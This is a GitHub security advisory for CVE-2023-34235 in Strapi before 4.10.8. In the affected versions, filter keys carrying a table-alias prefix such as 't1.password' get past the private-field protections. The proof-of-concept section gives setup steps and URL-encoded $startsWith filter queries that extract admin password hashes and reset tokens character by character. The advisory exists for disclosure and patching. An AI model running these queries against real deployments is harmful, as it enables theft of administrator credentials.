# [H] Leaking sensitive user information still possible by filtering on private with prefix fields

## Summary
Severity: High
Advisory: GHSA-9xg4-3qfm-9w8f
CVE: CVE-2023-34235
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2023-07-25
Source: https://github.com/advisories/GHSA-9xg4-3qfm-9w8f
Type: github-advisory

## Affected
- npm: `@strapi/database` — affected >=0 <4.10.8
- npm: `@strapi/utils` — affected >=0 <4.10.8

## Details
### Summary
Still able to leak private fields if using the t(number) prefix 

### Details
Knex query allows you to change there default prefix 
```SqliteError: select distinct `t0`.* from `pages` as `t0` left join `admin_users` as `t1` on `t0`.`updated_by_id` = `t1`.`id` where (`t1`.`password` = 1)```
so if you change the prefix to the same as it was before or to an other table you want to query you query changes from password to t1.password password is protected by filtering protections but t1.password is not protected
### PoC
1 Create a contentType
2 add to its options "populateCreatorFields"
3 create 1 entity in your new content type
4 in settings enable the find route in settings for the content type you created for public
5 /api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=a%24
And now the api returns noting if you were to do
/api/(Your contenttype)?filters%5BupdatedBy%5D%5Bt1.password%5D%5B%24startsWith%5D=%24 it would return your entity

### Impact
You can do filtering attacks on everything related to the object again including admin passwords and reset-tokens.

## References
- https://github.com/strapi/strapi/security/advisories/GHSA-9xg4-3qfm-9w8f
- https://nvd.nist.gov/vuln/detail/CVE-2023-34235
- https://github.com/strapi/strapi
- https://github.com/strapi/strapi/releases/tag/v4.10.8
